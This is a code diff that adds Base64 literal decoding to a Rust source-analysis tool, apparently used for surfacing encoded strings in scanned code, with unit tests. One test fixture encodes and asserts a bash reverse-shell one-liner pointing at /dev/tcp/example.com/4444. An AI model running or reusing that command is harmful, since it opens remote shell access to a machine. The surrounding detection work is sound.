@@ -1181,6 +1181,27 @@ impl UnifiedSourceAnalyzer {
             };
             push_unique_string(report, seen_strings, decoded);
         }
+
+        // Language-specific stng adapters do not all recognize the same
+        // source-level Base64 spellings. Kotlin, for example, exposes a
+        // parser-confirmed literal but historically did not emit the decoded
+        // companion that Elixir emitted for the identical unpadded payload.
+        // Decode isolated literals here so `type: encoded` has a consistent
+        // surface across unified source languages. Requiring a substantial,
+        // wholly printable payload avoids turning hashes and binary resources
+        // into misleading decoded-string facts.
+        if let Some(decoded) = decode_printable_base64_literal(s) {
+            let decoded = StringInfo {
+                value: decoded.into(),
+                offset: Some(offset),
+                string_type: None,
+                encoding: "utf-8".to_string(),
+                section: Some("decoded".to_string()),
+                encoding_chain: vec!["base64".to_string()],
+                fragments: None,
+            };
+            push_unique_string(report, seen_strings, decoded);
+        }
     }
 
     /// Name a function definition.
@@ -1298,6 +1319,45 @@ fn decode_printable_hex_literal(value: &str) -> Option<String> {
     String::from_utf8(decoded).ok()
 }
 
+/// Decode a parser-confirmed Base64 string literal when it yields meaningful
+/// printable text. Both padded and unpadded standard/Base64URL forms are
+/// accepted because runtime decoders commonly accept omitted padding.
+fn decode_printable_base64_literal(value: &str) -> Option<String> {
+    use base64::{
+        Engine as _,
+        engine::general_purpose::{STANDARD, STANDARD_NO_PAD, URL_SAFE, URL_SAFE_NO_PAD},
+    };
+
+    const MIN_ENCODED_LEN: usize = 24;
+    const MIN_DECODED_LEN: usize = 16;
+
+    let cleaned: String = value.chars().filter(|c| !c.is_ascii_whitespace()).collect();
+    if cleaned.len() < MIN_ENCODED_LEN || cleaned.len() % 4 == 1 {
+        return None;
+    }
+    if !cleaned.bytes().all(|byte| {
+        byte.is_ascii_alphanumeric() || matches!(byte, b'+' | b'/' | b'-' | b'_' | b'=')
+    }) {
+        return None;
+    }
+
+    let decoded = STANDARD
+        .decode(&cleaned)
+        .or_else(|_| STANDARD_NO_PAD.decode(&cleaned))
+        .or_else(|_| URL_SAFE.decode(&cleaned))
+        .or_else(|_| URL_SAFE_NO_PAD.decode(&cleaned))
+        .ok()?;
+    if decoded.len() < MIN_DECODED_LEN
+        || !decoded
+            .iter()
+            .all(|byte| matches!(byte, b'\n' | b'\r' | b'\t' | 0x20..=0x7e))
+    {
+        return None;
+    }
+
+    String::from_utf8(decoded).ok()
+}
+
 /// Heuristic: tree-sitter node names that correspond to integer
 /// numeric literals across our supported grammars. Generic enough to
 /// avoid per-language config; the parser fails fast on non-numeric
@@ -1370,7 +1430,30 @@ fn parse_numeric_literal(text: &str) -> Option<(i64, u32)> {
 
 #[cfg(test)]
 mod numeric_literal_tests {
-    use super::{decode_printable_hex_literal, is_numeric_node_kind, parse_numeric_literal};
+    use super::{
+        decode_printable_base64_literal, decode_printable_hex_literal, is_numeric_node_kind,
+        parse_numeric_literal,
+    };
+
+    #[test]
+    fn decodes_unpadded_printable_base64_source_literals() {
+        assert_eq!(
+            decode_printable_base64_literal(
+                "YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC9leGFtcGxlLmNvbS80NDQ0IDA+JjEn"
+            )
+            .as_deref(),
+            Some("bash -c 'bash -i >& /dev/tcp/example.com/4444 0>&1'")
+        );
+    }
+
+    #[test]
+    fn rejects_short_or_binary_base64_source_literals() {
+        assert_eq!(decode_printable_base64_literal("aGVsbG8="), None);
+        assert_eq!(
+            decode_printable_base64_literal("AAECAwQFBgcICQoLDA0ODxAREhMUFRYX"),
+            None
+        );
+    }
 
     #[test]
     fn decodes_compact_printable_hex_source_literals() {
